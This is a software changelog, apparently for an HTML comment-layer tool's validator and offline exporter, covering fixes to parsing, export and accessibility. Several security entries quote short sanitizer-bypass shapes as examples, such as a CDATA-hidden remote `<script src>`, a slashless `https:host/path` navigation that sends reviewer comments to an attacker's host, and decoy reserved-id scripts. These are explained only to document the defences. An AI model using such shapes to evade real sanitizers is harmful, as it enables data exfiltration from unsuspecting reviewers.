  `generate_toc.py` follows the same rule, so a generated table of contents no longer labels an
  entry with text a reader cannot see: a heading that contains a template is listed by its visible
  text only, and a heading whose text is entirely inside a template is dropped from the TOC (and
  gets no generated slug id) - which also means a `report`/`plan` whose only `<h1>` is parked in a
  template now correctly fails the top-level-title requirement instead of passing on an invisible
  title.
## [1.434.0] - 2026-08-03

### Fixed

- A NUMERIC character reference in an attribute value now resolves the way a BROWSER resolves it,
  not the way `html.unescape()` does. The validator's vendored browser rule delegated the numeric
  case to `html.unescape()`, which is not the HTML tokenizer's "numeric character reference end
  state" and disagrees with it identically on every interpreter (so this was a validator-vs-browser
  gap, not the 3.12/3.13 host drift the rule was written for).
  - `html.unescape()` DELETES the code points it deems invalid, so `&#1;`, `&#x7f;`, `&#x8d;` and
    the noncharacters vanished where Chromium keeps U+0001, U+007F, U+008D and U+FFFE. A
    validator-visible `id`, `href`, `content` or `data-*` could therefore differ from the value the
    DOM actually carries - the very class of mismatch the rule exists to close.
  - The end state is now implemented directly: U+FFFD for the null character, for a surrogate and
    for anything past U+10FFFF, the C1 (0x80-0x9F) replacement table applied, and every other code
    point kept.
  - An OVERSIZED reference (more digits than Python's integer conversion limit) resolves to U+FFFD
    instead of raising. The digit run is bounded before any integer conversion, and because the
    host decodes attribute values inside its own `parse_starttag()` and raised there first - which
    every parse entry point swallowed into a TRUNCATED parse, hiding every finding after that tag -
    such a start tag is now taken away from the host before it decodes anything and dispatched from
    its RAW text through the vendored tokenizer, leaving the rest of the document live. That
    recovery mirrors the host's dispatch exactly (start-vs-self-closing decided by the tail
    attribute tokenization stopped at, and the host's own raw-text / RCDATA / `plaintext` /
    `noscript` mode re-entered), so a recovered tag behaves like every other tag in the same parser.
    Attribute values only: an oversized reference in the document's TEXT still fails the parse
    closed, as it always has, and the theme-contrast scan (which builds its own parser and
    degrades every failure to "no findings") now REPORTS that one shape rather than letting a
    single attribute silently disable the whole check.

## [1.432.0] - 2026-08-03

### Fixed

- The export intent toast now decides what is an export control by IDENTITY - the very buttons the
  layer's own export handlers bound themselves to, resolved once at startup - instead of trusting
  the clicked button's `id`. The annotated document is untrusted author content, so a document that
  merely contained `<button id="btnPrint">` used to make the layer announce `Exporting as PDF...`
  for a click that ran no export at all, telling a reviewer a document had been exported when
  nothing was. A borrowed id now raises no toast; every real control (both menus, all five formats)
  still announces.

## [1.428.0] - 2026-08-03

### Fixed

- A sidebar re-render no longer strands focus on `<body>`. Rendering replaces the whole comment list,
  so the checklist / note / board `reset` buttons and the comment and reply delete confirms destroyed
  the very control the reviewer was on and left `document.activeElement` on `<body>` - a keyboard or
  screen-reader user lost their place entirely and had to tab in from the top of the page. Every
  render now notes where focus was before it rebuilds and hands it to the equivalent rebuilt control,
  or to whichever control took its place, or - when the list is left empty - to the list container
  itself, which is now labelled and takes a focus ring. A control that cannot actually take focus
  (hidden by the comment filter, disabled, or inert) is skipped rather than silently swallowing the
  restore. Only focus that was inside the list is carried, so a re-render triggered from elsewhere (a
  note being typed, a checklist ticked in the document) still leaves focus exactly where it was.

## [1.427.0] - 2026-08-03

### Fixed

- The validator now keeps a HEADING that a document leaves unclosed at end of input. A file
  truncated inside a heading (`<h2 id="sec">Title` with no closer) dropped that heading from the
  parsed view entirely, even though a browser renders it - exactly as it runs an unclosed
  `<style>` to the end of the document. Every heading-derived check was blind to the last heading
  of such a file: the id scan, the TOC/anchor scan and the heading path a comment anchors to. The
  parser now finalizes an open heading at end of input through the same helper the end tag uses,
  so its text, id and top-level/lede flags read the same either way. The same helper now also
  ends a heading when an ANCESTOR closes, and when a NEW heading starts on it, as a browser does:
  text after `</section>`, after the end of `#commentRoot`, or after a following `<h2>` is no
  longer glued onto the heading (which used to swallow the following prose - and the next
  heading, id and all - into one title).

## [1.425.0] - 2026-08-03

### Fixed

- The validator's tag-attribute lookup now draws the same element boundaries as the document
  parser, so one document cannot be two documents depending on which check is asking. It was a
  bare `HTMLParser`, which consumes a whole `<![CDATA[ ... ]]>` marked section in every context,
  while a browser (and the shared boundary layer every other check reads) treats one in HTML
  content as a bogus comment ending at the first `>`. A `<![CDATA[><script src="//host/x.js">
  </script>]]>` therefore left a LIVE external script that the self-contained and offline resource
  checks - which read the lookup - reported as absent. The lookup now derives from the shared
  `_BrowserBoundaries` base (raw-text and comment boundaries, foreign content, the HTML5 implicit
  close and end-of-input rules included) and indexes every tag in ONE cached pass, so it is also no
  longer a fresh document parse per tag.
- The self-contained and offline resource checks now also see the markup inside a `<noscript>`
  fallback. That body is raw text only while scripting is ENABLED; with scripting off a browser
  parses it and really does load what it names, so a network `<img>`, `<link>` or `<meta refresh>`
  hidden there is now reported instead of passing the self-contained guarantee. The fallback view
  is read through its own lookup, so a PRESENCE question still reads the browser's own view - a
  Content-Security-Policy `<meta>` inside a `<noscript>` no longer satisfies the offline policy
  requirement. A tag lookup whose parse fails is reported as unreadable rather than read as a
  document that loads nothing.
- The tools outside the validator's `checks` package - the deck validator, the contrast scanner,
  and the `doc_stats`, `fix_skip`, `generate_toc` and `wrap_sections` authoring tools - decode
  attribute values through that same shared browser rule instead of trusting the host
  `html.parser`. Each kept its own attribute dict, so the same document was read one way by the
  validator and another way by the tool beside it: a named character reference that is only a
  PREFIX of the value (`class="mermaid &nbspcm-skip"`) resolved on Python 3.12 and invented a
  `cm-skip` token the author never wrote, and a duplicated attribute kept the LAST occurrence
  where HTML5 keeps the first - which let a decoy `http-equiv` hide a `<meta refresh>` redirect
  from the deck's active-content scan, a decoy `style=` hide the live declaration from the
  contrast scanner, and a decoy `id="commentRoot"` scope the section wrapping to the wrong
  element.

## [1.416.0] - 2026-08-03

### Fixed

- The export no longer decides WHICH block is the layer's own by document position. The embedded
  comments, the handled ids, and the `commentableHtmlLayer` descriptor are now resolved against
  the content-root boundary: a script
  that borrows one of those ids inside `#commentRoot` is authored content and is never the layer's
  block, so it can neither receive the review state on export nor stand in for a block the document
  has actually lost (that still fails loudly). The same boundary applies on the READ side - the
  embedded comments, the handled ids that PRUNE live comments, and the descriptor read behind the
  Offline badge - so an export always rewrites exactly the block a reload reads back. (The
  review-state block answers to the stricter region-ownership rule instead.)
- A document with more than one element carrying the content-root id now resolves NOTHING instead
  of falling back to position. That duplicate is exactly how a planted wrapper would re-point the
  boundary, so the export refuses with a message naming the duplicate id, and a reader admits no
  block. A document that simply has no content root is unchanged: nothing delimits an untrusted
  region there, so the plain tree-order answer still stands.
- Every descriptor copy in the layer's own region is retargeted by every export that writes a copy
  of the document (Save and Shareable as much as Standalone and Offline), not just the first one a
  reader resolves. The mode a plain Save writes is the document's own, so a re-saved Offline copy
  stays Offline. Rewriting only that one left any
  other reserved-id copy stale, so an exported document could ship two descriptors disagreeing
  about what it IS. Additional copies are only rewritten when they are inert data (no `src`, a
  non-runnable type), so an author's runnable script that borrows the id keeps its code; a copy
  inside the content root is returned byte-intact; and a document whose only owner of that id sits
  in the content root is refused rather than given a freshly minted second descriptor.
- Plain export's data-leak safety net judges what survived by the same boundary instead of a
  document-wide text probe, so a document carrying an authored reserved-id script in its content no
  longer aborts an otherwise clean plain export. An ambiguous (contested) boundary still counts
  every owner as leaked, so that case fails closed.
- When elements carry a reserved id but none resolve, the runtime now says so once per id on the
  console, and each export names which state it hit ("the block is inside the content root", "the
  content-root id is duplicated", "the region is absent"), so review state can never silently
  vanish behind a misleading message.

### Notes

- Recorded as a deliberate scope boundary: Export as Shareable does NOT neutralize a script that
  borrows a reserved commentable-html data id, the way Export Offline retypes one to inert JSON.
  Offline does that because its zero-network promise requires the egress strips' reserved-id
  exemption to be earned; Shareable makes no such promise and preserves author scripts by design,
  so the decoy travels untouched. What protects a Shareable export is the boundary above, not a
  rewrite of the author's script.

## [1.407.0] - 2026-08-03

### Fixed

- The Offline export's strips now inspect two shapes they used to walk straight past. A
  `<script type="speculationrules">` or `<script type="importmap">` block is ACTIVE without being
  JavaScript - a speculation ruleset makes the browser prefetch or prerender by itself, and an
  import map re-points where a bare module specifier resolves, which the remote-import scan cannot
  see because the importing script names no URL - so the JavaScript-MIME predicate never looked at
  either. A speculation ruleset is now removed outright (it can prefetch the document's own links
  through `"source": "document"` without naming a URL at all, and it has nothing to offer a
  single-file offline export), and an import map is removed unless every reference in it, key and
  value alike, is relative - which is decided by parsing the JSON rather than scanning its text, so
  a `\u002f`-escaped, whitespace-padded, tab-split, backslash-authority or `data:`/`blob:`-scheme
  target cannot slip through. An external (`src`-bearing) or unparseable block is removed too, and
  a parameterized spelling such as `importmap;charset=utf-8` is left alone because a browser treats
  it as inert data. And `<template>` content, which `querySelectorAll` never descends into but
  serialization preserves verbatim, is now walked recursively at any depth by the reserved-id
  neutralize pass, the loader strip and the event-handler/URL scrub, so a script parked in a
  template for a later adopter to insert can no longer carry a remote import, a navigation beacon,
  a network image, a network `url(...)` or an inline event handler into an offline file. The strict
  validator applies both rules too - from a mirrored type list and pattern, and from separate
  template-content views that only the offline checks read - so it can neither bless a file the
  exporter would strip nor reject one it just produced.

## [1.404.0] - 2026-08-03

### Fixed

- The validator now folds TAG and ATTRIBUTE names ASCII-case-insensitively, the way a browser
  folds them, instead of inheriting `html.parser`'s Unicode `str.lower()`. U+212A KELVIN SIGN is
  the one character outside ASCII that lowercases to an ASCII letter ("k"), and that was enough
  to read `data-\u212aey` as `data-key`, `<lin\u212a>` as a `<link>` and `</mar\u212a>` as a
  `</mark>` closer - names a browser keeps distinct, so the validator could see a different
  document from the one a reader gets. The rule that already governed a raw-text end tag
  (`re.ASCII`) now governs every name the checks key on, in the one shared attribute helper and
  in a `_BrowserTagNames` base the document, code-span, tag-lookup, checklist, notes and density
  passes all build on.
## [1.403.0] - 2026-08-03

### Fixed

- Section-review state is now read from, and written to, the block the EMBEDDED COMMENTS region
  OWNS, instead of the first element the browser's id lookup returns. A decoy element carrying the
  `reviewedSections` id earlier in a document (a hand-authored file, or one a botched edit left with
  two) used to shadow the real block completely: the reader's Reviewed/Changed badges were computed
  from the decoy's markers, and an export baked the current state INTO the decoy while the
  region-owned block kept its stale contents - silent loss of user data that nothing reported. The
  runtime now resolves the block by the region's own BEGIN/END markers and document order, leaves a
  decoy with its own contents, and inserts a fresh region-owned block when the document owns none.
  Absent markers still let a lone block resolve, so a file upgraded from before the feature existed
  keeps working; markers that are present but not one ordered pair resolve nothing, only a `<script>`
  can carry the id (exactly what the validator accepts), and a `<noscript>` cannot hide a block from
  the reader while offering it to the export (`DOMParser` parses `<noscript>` contents as markup, a
  live browser does not). When nothing can be attributed to the region, the export declines and the
  download toast says why - a separate toast would simply be replaced by it - and the load warns the
  reader once, in a toast and in the console, rather than quietly showing every section unreviewed.
- `validate.py` now reports both shapes of the same problem as errors: a duplicated
  `reviewedSections` id (like the three other reserved state-block ids) and an id the EMBEDDED
  COMMENTS region does not own (a block outside it, or one that is not a `<script>`), and
  `mark_reviewed.py` refuses to write a block that region does not own. Its shape check only ever
  read the region-owned block, so
  either file used to pass `--strict` while the runtime ignored or mis-wrote the reader's state.

## [1.399.0] - 2026-08-03

### Fixed

- The Offline export's loader strip and the strict validator both missed a script that loads
  through `href` / `xlink:href` instead of `src`. An SVG `<script>` never uses `src` - it loads
  through SVG2 `href` or the legacy `xlink:href` - and its body is empty, so the strip's
  `script[src]` selector never saw it and the inline egress scan (which reads `textContent`) had
  nothing to read; `validate.py --strict` mirrored the same blind spot and certified such a file as
  offline-clean. The zero-network CSP was the only thing left between that element and the fetch,
  and the strip and the gate exist precisely so the guarantee does not rest on the CSP. Both now
  scan `src`, `href`, and `xlink:href`, and a parity test pins the two implementations' attribute
  sets together in both directions. Each script element is examined once, so one carrying two
  network attributes is removed - and counted in the download toast - once; a relative or `data:`
  reference is still left untouched. What counts as a load is namespace-blind on both sides, but
  what is done about it is not: an SVG script goes (SVG2 ignores its body while `href` is present,
  so clearing the attribute would start executing it), while on an HTML script the same attributes
  are inert and only the ATTRIBUTE is removed - so an author's running code is never lost over a
  dead attribute, and the validator, whose flat tokenizer has no namespace to consult, still finds
  nothing to complain about.
- The offline strip now also walks `<template>` content for its load passes - scripts, media, links,
  forms and styles - rather than scripts alone. A template's children live in an inert fragment that
  `querySelectorAll` cannot reach, while the validator's tokenizer reads those tags plainly, so a
  network-loading element parked in a template rode into an export that its own `--strict` gate then
  rejected. The inline-egress scan deliberately stays on the document's own scripts, matching the
  validator's script model: template content never executes, so scanning it would only cost an author
  a script body the gate is happy with.
- The exporter's and the validator's network-URL predicates now allow exactly the leading
  characters a browser REMOVES before it parses a URL - C0 controls and spaces, U+0000 to U+0020 -
  instead of `String.trim()` on one side and nothing on the other. A padded value of that kind
  loads, and the validator used to bless exactly the file the strip had just cleaned; a value
  padded with NBSP or U+FEFF resolves as a relative reference and is now left alone by both. A
  parity test runs the runtime's own pattern in node against the validator's copy.
- The Chart.js CDN exemption in shareable mode is bound to a `src` loader again. Widening the
  script-load set had extended it to `href` / `xlink:href`, where the version and SRI checks that
  justify the exemption never run, so a remote script whose path merely ends in `chart.min.js`
  would have passed validation unexamined.

## [1.396.0] - 2026-08-03

### Fixed

- Every floating affordance now measures the VISUAL viewport instead of the layout viewport, so an
  on-screen keyboard or a pinch zoom can no longer hide one. `window.innerWidth` / `innerHeight`
  describe the LAYOUT viewport: it does not shrink when a soft keyboard opens (iOS Safari, and
  Chrome for Android with the default `interactive-widget=resizes-visual`) and does not move when a
  pinch-zoomed page is panned, and neither fires a `window` `resize`. A control the layer believed
  fitted could therefore sit behind the keyboard - and focusing a comment textarea is exactly what
  opens it.
  - One shared vocabulary (`cmhViewportBox()`, `cmhViewportRect()`, `cmhOnViewportChange()`) now
    prefers `window.visualViewport` (size plus `offsetLeft`/`offsetTop`, since a `position: fixed`
    control is placed in layout coordinates that a pan shifts under it) and falls back to
    `window.innerWidth`/`innerHeight` where that API is absent.
  - The hover bubble, every structural add button, the in-document comment dialog (placement,
    height cap, and unanchored re-fit), the floating composer (placement, drag clamp, centred
    document/slide anchor), the Add-comment selection menu, the heading add button, and the chart
    and chrome tooltips are all bounded by that box. An ANCHORED affordance whose anchor leaves
    the visible box (the hover bubble, the add buttons, a dialog being read) hides or closes
    rather than floating over the keyboard; a surface holding reviewer input (the composer, a
    dialog mid-edit) and the Add-comment menu are re-clamped into the visible box instead, so no
    draft is thrown away.
  - They react to `visualViewport` `resize` and `scroll` as well as the `window` events, through
    one shared listener set that every surface registers with exactly once, so repeatedly opening
    and closing surfaces cannot multiply listeners. The two hover tooltips are dismissed rather
    than moved (the next pointer move or focus raises them again), which is also the one visible
    change on a plain desktop window resize.
## [1.395.0] - 2026-08-03

### Security

- The `Export Offline` action no longer inlines the vendored rich-content payload's bytes without
  scanning them. The payload is inflated and appended as an EXECUTABLE script AFTER both offline
  strips have run, so a remote dynamic import or a direct scripted navigation to a network URL
  routed through the payload used to land in the exported file with the strips bypassed - egress
  inside a file whose whole promise is zero network, and a capability the ordinary authored-script
  path never had (the strips delete exactly those shapes). The payload's bytes now clear the same
  two content gates the captured-copy path already applied - the network-egress scan and the
  script-data escape check - through one shared predicate, so the two paths cannot drift. A refusal
  is loud and specific: the export fails with a message naming the library, the pattern its bytes
  matched, and the remedy (re-run the authoring finalize step to refresh the vendored payload), and
  no file is downloaded, instead of the generic missing-bundle message that sent the user looking
  for a payload the document does carry. There is deliberately no fallback to a copy already inlined
  in the document, which would let anyone who can edit the payload invert the payload-wins
  precedence and silently substitute another source. The shipped bundles pass the gates, so the
  legitimate path is unchanged.

## [1.391.0] - 2026-08-03

### Fixed

- The Offline export's navigation strip, and the strict validator that mirrors it, now recognize a
  network URL literal spelled WITHOUT the slashes after its scheme (issue #870). A browser resolves
  `location.href = "https:host/path"` to `https://host/path`, so that one-token spelling change
  navigated the whole document - every reviewer comment with it - to an attacker's host while
  matching neither copy of the pattern, and no CSP delivered in a `<meta>` can restrict top-level
  navigation, so nothing else would have stopped it. Unlike the misses the residual documents
  (aliasing, computed access, a runtime-assembled URL), this one needed no indirection at all, and
  because the validator agreed with the strip it also blessed such a file as offline-clean. The
  URL literal is now recognized in the three literal prefixes a browser resolves to a network host -
  scheme plus slashes, protocol-relative, and scheme-only - in both copies, which stay
  byte-identical. A quoted `https:` that is not a navigation (a scheme constant compared against, a
  comparison, a sink a local binding shadows) still survives, and the tail is a bare alternation of
  literals, so it cannot backtrack. The literal is still read RAW, so a URL the browser NORMALIZES
  first - one led or interrupted by whitespace, or a scheme spelled with a JavaScript string escape -
  is still missed, and that class is now named in the CMH-OFFLINE-05 residual instead of being
  implied away (issue #914).


## [1.390.0] - 2026-08-03

### Fixed

- Media anchors: an unlabeled figure is no longer identified by its position alone. An image comment
  resolves by `imageIndex` and falls back to the stored `imageSrc`/`imageAlt`/`imageKind`, so media
  with NO label and no src - an unlabeled inline `<svg>`, an unlabeled chart `<canvas>` - had no
  identity at all beyond its index: inserting a figure ahead of it silently moved the comment to a
  DIFFERENT graphic, because the metadata check had nothing to disagree with. Such a comment now also
  stores `imageSig`, a short digest of an AUTHORED shape descriptor (the tag, an author `id`, the
  figure's caption, an svg's `viewBox` plus the shape it draws down to each descendant's drawing
  attributes and its own text, a chart canvas's `data-cmh-chart-*` attributes) that excludes
  everything the runtime writes, so a reload, a re-render, a device-pixel-ratio change and an
  export/reopen all recompute the same value. The comment now
  re-anchors to the figure it was left on, or stays unresolved when the shape is genuinely
  ambiguous, instead of attaching itself to another figure. The signature is the discriminator of
  last resort: it never overrides a label or a src (so redrawing a still-labelled figure keeps its
  comment), it is never shown to a reader (no card, `Copy all` line, Markdown export or printed
  sheet - it rides along only inside an export's embedded comment record, so a reopened copy can
  re-anchor), and a comment saved before the field existed - or one carrying a value no signature
  this runtime writes could be - resolves exactly as it did.

## [1.375.0] - 2026-08-02

### Fixed

- Export as Shareable (and every path built on it - Save, Standalone, Offline) now locates the
  embedded-comments block and the layer descriptor structurally instead of scanning the document
  text. The layer's own source is part of every document and necessarily spells
  `<script id="embeddedComments">`, so the text scan was answered by the runtime itself: the
  "make sure the EMBEDDED COMMENTS region is present" error could never fire, and a document that
  had genuinely lost that region exported a copy whose runtime source had been overwritten
  mid-function with the comments JSON. The same defect in the descriptor path overwrote a quarter
  of a megabyte of runtime on every Offline export of such a document. Both now fail loudly and
  download nothing, and a re-fetched on-disk copy is accepted as the export base only when a real
  block resolves in it.
- The resolver follows the HTML tokenizer rather than approximating it, so text a browser parses
  as CONTENT can no longer masquerade as the block: an end tag must match the element name
  exactly, `<!-- -->` (including the empty `<!-->` form and a `--!>` terminator), DOCTYPEs, bogus
  declarations and processing instructions are consumed, `<iframe>`/`<noscript>`/`<xmp>` content
  is text, `<template>` content is the inert fragment `getElementById` cannot see (nesting
  included), the `<!--<script>` double-escape idiom is honored, and tag names and attributes are
  tokenized on ASCII whitespace only. Every result is cross-checked against the browser's own
  parse before anything is spliced, so a shape the two cannot agree on fails loudly instead of
  being rewritten on a guess. Resolution now also requires exactly ONE owner of the id on each
  side, so a duplicate block or an element shadowing the id is refused rather than guessed at. An
  unquoted attribute value containing an apostrophe, and a legal empty comment, no longer swallow
  the rest of the document.
- A document with no layer descriptor at all now has one re-anchored to its version `<meta>` tag
  matched the way a parser sees it (a DOM-serialized `<meta ...>` carries neither the space nor
  the slash the old pattern required), and the export fails loudly if there is nothing to anchor
  to - instead of quietly downloading a document with no descriptor.

## [1.371.0] - 2026-08-03

### Fixed

- A TRUNCATED document now validates the same way on every interpreter. CPython changed how
  `html.parser` resolves end of input in 3.12.11 / 3.13.5 (gh-135462), so until now the same file
  could read two different ways depending on which patch release ran it - and CI proved it, because
  its two runner images resolve different 3.12 patches. Each case is now decided by the skill's own
  browser-accurate boundary layer instead of the host:
  - An UNCLOSED `<style>` or `<script>` contributes its whole body. A browser runs a raw-text
    element that never closes to end of document, so its content is live; on an older patch release
    that trailing text stayed in the parser's buffer, the element's body came back EMPTY, and a
    dangerous unscoped rule (for example `[hidden] { display: none !important; }`) could hide from
    the CSS checks behind a missing closing tag.
  - A TRUNCATED tag is discarded - a raw-text closer (`</script data-`), a start tag or an end tag -
    because end of input inside a tag drops the tag in a browser. An older host handed those
    characters back as element content, which was enough to plant CSS in a `<style>` body or to
    forge the layer's ready token in a `<script>` body.
  - An unterminated `<?` or `<!` runs to the end of the document as comment data (as an unterminated
    `<!--` already did) rather than reappearing as document prose, and `</` is read the way a browser
    reads it: text when nothing follows, a bogus comment when what follows is not a tag name.
  A document that is not truncated is unaffected, and an incremental caller still never loses a tag
  that was merely split across two chunks of input.
- A raw-text element's end tag is no longer mistaken for an unfinished one because of a bare quote.
  A quoted attribute value exists only after `=`, so `</script " >` really does close the script; it
  used to look unfinished, which ran the raw-text region on to the end of the document and hid the
  author's real `<pre><code>` block from the syntax-highlighting and KQL checks.

## [1.370.0] - 2026-08-02

### Fixed

- The open in-document comment dialog no longer eats the reviewer's FIRST click on layer chrome that
  sits OUTSIDE the content root. The outside-click swallow is now stated as the rule it always meant - swallow only a
  pointer click that lands in the ANNOTATED DOCUMENT (the content root the layer anchors to), the
  only thing the dismiss must stop from acting - instead of swallowing everything but an enumerated
  list of carve-outs. So in a document with a content root, switching from one comment to another by
  clicking a second highlight's "Open comment" bubble takes ONE click again, and an overlay or
  actionable toast the dialog's own Save raised (the storage manager and its "Manage storage"
  recovery action on a quota failure) acts
  on the first click rather than being spent closing the dialog. Two deliberate consequences: layer
  controls injected INSIDE the content root (a sortable-table sort control, a widget reset) cannot be
  told from document content by containment and are still swallowed, and author page furniture a
  retrofitted document keeps outside its content root now acts on that click. The existing
  guarantees are unchanged: a pointer click on document content is still swallowed - including
  content that carries the layer's own class names or a chrome control's id, a node another
  capture-phase listener detaches mid-dispatch, and an unclassifiable target - a keyboard-activated
  click is still never swallowed, a mid-edit dialog still stays open without swallowing, and where
  `#commentRoot` is absent and the layer anchors to `<body>` that mode swallows exactly what it
  always did. (`CMH-CORE-16`, `CMH-EXP-15`)
## [1.364.0] - 2026-08-02

### Fixed

- A sidebar re-render no longer pulls focus into a re-opened inline reply/edit draft when the
  reviewer was working somewhere else. The draft snapshot now records whether the editor held
  focus; the re-opened editor restores its text and selection either way, but is only re-focused
  when it owned focus before the re-render. Previously any re-render triggered from elsewhere - a
  note-typing debounce, a checklist change, a composer save that returns focus itself - yanked the
  caret out of the control the reviewer was actually using and into the sidebar textarea, a
  disorienting jump for keyboard and screen-reader users. When the control that owned focus was one
  of the editor's own (a formatting-toolbar button, Save, Cancel), focus is handed back to the
  rebuilt equivalent rather than dropped into the textarea.

## [1.363.0] - 2026-08-02

### Changed

- The reply box in the comments panel is no longer uncomfortable to write in (issue #851). Its text
  was rendered with the SMALL chrome token (`--cp-chrome-small-font`, the one used for timestamps
  and metadata), so a reply was typed about 15% smaller than the comment it answers and smaller than
  the composer that comment was written in; it now uses the regular `--cp-chrome-font`, matching both.
- Every authoring textarea now AUTOGROWS to fit what is being written - the side-pane inline
  reply/edit editor, the floating comment composer, and the in-document comment dialog's editor.
  A multi-paragraph reply no longer has to be written into a two-line box, scrolled inside, or
  dragged open by hand on every reply. Growth stops at a cap (the box then scrolls, so Cancel/Save
  are never pushed out of the panel), removing text shrinks the box back, an editor opened on
  existing text starts at content size, and a floating composer or dialog that grew keeps itself
  fully on screen so its Save button stays reachable. Dragging the resize handle still wins -
  autogrow stops for an editor the reviewer has sized by hand, the cap does not bound that drag,
  and the hand-picked size now survives a re-render of the comments panel.

## [1.361.0] - 2026-08-02

### Fixed

- The validator now decodes an attribute value's character references the way a BROWSER decodes
  them, on every interpreter. Python 3.12 unescaped the whole value with `html.unescape()`, so a
  named reference with no trailing semicolon was resolved inside an attribute (`id="&notit;"` became
  `id="\u00acit;"`), while Python 3.13 and a browser leave it literal. The same document could
  therefore carry different `id`, `class`, `href`, `src`, `content` and `data-*` values depending on
  which Python ran the validator - and with them a different duplicate-id, link, meta-handshake or
  companion-resource verdict. The browser rule for NAMED references, and the start-tag attribute
  tokenizer it runs over, are now vendored beside the shared `_BrowserBoundaries` layer and applied
  to the raw start tag, so the values the checks see never come from the host. (Numeric references
  still resolve through `html.unescape()`, which behaves the same on every interpreter.) Every
  attribute view in the validator's `checks` package now shares that one helper - both tolerant
  document passes, the tag-attribute lookup, and the checklist, notes and density passes - so a real
  duplicate `data-cmh-item` id spelled two ways (`&notit;` and `&amp;notit;`) is no longer missed on
  Python 3.12. Because that vendors a small amount of CPython's `Lib/html/parser.py`, the shipped
  `THIRD_PARTY_NOTICES.md` now also carries the PSF License, its copyright notice, and a summary of
  the changes made.

## [1.360.0] - 2026-08-02

### Fixed

- Offline export: a decoy runnable script can no longer bypass both offline strips by borrowing one
  of the layer's reserved DATA ids. The strips exempted `embeddedComments`, `handledCommentIds` and
  `commentableHtmlLayer` by ID ALONE, tested BEFORE they checked whether the script was runnable, so
  a script that merely carried one of those ids executed in the exported file untouched by the
  remote-dynamic-import strip and the top-level-navigation strip alike - no aliasing and no
  obfuscation needed. The exemption is now earned rather than claimed: a reserved-id script whose
  type would RUN is retyped to `type="application/json"` before anything reads the document, so the
  strips exempt it on the ordinary runnable-type test, exactly as the strict validator's own egress
  check already did (it never had an id skip, which is how the exporter could preserve a script
  `validate.py --strict` then rejected).
- The repair keeps the bytes rather than deleting them, because these blocks hold review state and a
  reviewer legitimately quoting an egress shape must never lose their comment. A legacy or
  hand-authored document whose data block carries no `type` is therefore repaired into inert data
  instead of being executed or stripped - which also repairs the block's TYPE for the strict
  validator (a duplicated reserved id, or a body that is not valid JSON, stays the source document's
  own pre-existing invalidity) and shields it from the renderer strip, which never had an id skip.
  The download toast now names how many scripts were kept as inert data beside how many were
  removed, counted after the strips so one script can never be reported as both (a reserved-id block
  carrying a network `src` is still removed, because a remote load is what the strip exists to take
  away).
- Two boundaries that go with it: `reviewedSections` was not in the old skip list, so a runnable one
  carrying egress used to be removed and is now kept as inert data instead; and the vendored payload
  id is deliberately NOT neutralized, because it is infrastructure resolved by position, so a script
  that merely borrows that id stays authored content and must clear the same egress scan as any
  other script.

## [1.351.0] - 2026-08-02

### Fixed

- A wide diagram no longer prints with washed-out edges. The scroll-fade mask that cues horizontal
  scrolling on screen is now declared `screen`-only, so a diagram host carrying it prints with no
  edge mask - for both `pre.mermaid` and `div.mermaid` hosts. The on-screen cue is unchanged.

## [1.350.0] - 2026-08-02

### Changed

- The "Portable" concept is now called "Shareable" everywhere, because that is what a reader
  actually gets: one self-contained HTML file you can send to someone. The runtime UI reads
  `Export as Shareable` / `Shareable` / `Not shareable`, the shareability badge and its tooltips,
  the Help/About panel, the toasts, the skill references, `SKILL.md`, the tutorial, the demo
  reports and the showcase deck, and the marketplace site pages all follow. `NonPortable` became
  `NonShareable`.
- The rename goes all the way down to the internal identifiers: the layer descriptor now emits
  `"mode": "shareable"` / `"nonshareable"`, the dist templates are `SHAREABLE.html` and
  `NONSHAREABLE.html`, the companion bootstrap anchor is
  `<!-- BEGIN/END: commentable-html - NONSHAREABLE BOOTSTRAP -->`, `new_document.py` and
  `retrofit.py` take `--shareable` / `--nonshareable`, `tools/authoring/to_portable.py` is now
  `tools/authoring/to_shareable.py`, and the validator's symbols and diagnostics say
  `nonshareable mode: ...`.

### Compatibility (existing documents keep working, unchanged)

- Every document produced by an earlier release keeps loading, behaving, and validating exactly as
  before - with no new error and no new warning:
  - the legacy descriptor modes `"portable"` / `"nonportable"` stay accepted by the validator, by
    `to_shareable.py`, and by the runtime, and are treated as equivalent to the new values;
  - the legacy `NONPORTABLE BOOTSTRAP` comment anchor stays recognized by `upgrade.py`,
    `retrofit.py`, `to_shareable.py` and the in-page exports, so a legacy companion document still
    upgrades, migrates, and exports to a single file (a MIXED anchor pair, which a hand-edited or
    partially-migrated document can carry, is handled too);
  - re-exporting a file an earlier release produced keeps its name tidy: the pre-rename
    `-portable` suffix is stripped, so `report-portable.html` exports as `report-shareable.html`
    rather than `report-portable-shareable.html`;
  - the legacy `cm-nonportable` / `cm-nonportable-only` CSS hooks - baked into the markup of
    already-shipped companion documents - are kept beside the new `cm-nonshareable` ones, and the
    runtime sets both body classes;
  - the tools resolve `SHAREABLE.html` / `NONSHAREABLE.html` first and fall back to the legacy
    `PORTABLE.html` / `NONPORTABLE.html` names, so an older checkout or vendored stage still works,
    and a script that still passes `--template <dist>/PORTABLE.html` is pointed at the current
    file instead of failing to read a renamed one;
  - `--portable` and `--nonportable` remain accepted aliases on `new_document.py` and
    `retrofit.py`, and `tools/validate/validate.py` keeps its pre-rename module symbols
    (`NONPORTABLE_REGIONS`, `_is_nonportable`, ...) as aliases of the current objects;
  - `tools/authoring/to_portable.py` remains as a thin alias that forwards to `to_shareable.py`
    (printing a one-line deprecation note), so an existing script does not break.
## [1.333.0] - 2026-08-02

### Fixed

- Deleting a comment from the **Manage storage** dialog's per-comment list now closes the
  in-document comment dialog when it is showing one of the deleted comments, matching the sidebar
  delete and Clear all paths. Previously the live delete path closed any open floating edit composer
  but never the in-document dialog, so a reviewer who left that dialog open - especially in edit
  mode, where an outside click does not dismiss it - kept typing into an editor for a comment that
  no longer existed until Save discovered the loss. A dialog showing a comment that was NOT deleted
  stays open.

## [1.332.0] - 2026-08-02

### Fixed

- The in-document comment dialog no longer overflows a short viewport, which could put its Cancel
  and Save buttons out of reach. The dialog now caps its height to the measured viewport (minus the
  same 8px margin its position clamp uses, so a dynamic mobile browser toolbar counts) with a
  `calc(100vh - 16px)` CSS fallback and its own `box-sizing: border-box`, and scrolls internally
  instead: the rendered note in the note view and the toolbar-plus-textarea block in the edit form,
  with the actions row pinned and on screen. An in-progress edit, which deliberately outlives its
  anchor scrolling out of view, is re-fitted to the viewport on its own, so a mid-edit viewport
  shrink no longer strands Save and Cancel off screen either, and content that grows after the
  dialog was placed - dragging the textarea's resize handle - re-fits it through a `ResizeObserver`
